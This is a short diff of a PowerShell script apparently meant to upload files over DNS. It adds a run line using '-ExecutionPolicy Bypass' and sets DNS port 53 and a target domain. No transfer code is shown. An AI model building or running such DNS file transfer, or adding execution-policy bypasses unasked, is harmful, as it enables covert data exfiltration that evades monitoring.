@@ -1,3 +1,5 @@
+# powershell -ExecutionPolicy Bypass -File .\dns_file_uploader.ps1
+
 # Set DNS Server and Domain
 $DNS_PORT = 53
 $domain = "fileupload.domain.com"  # Domain to use
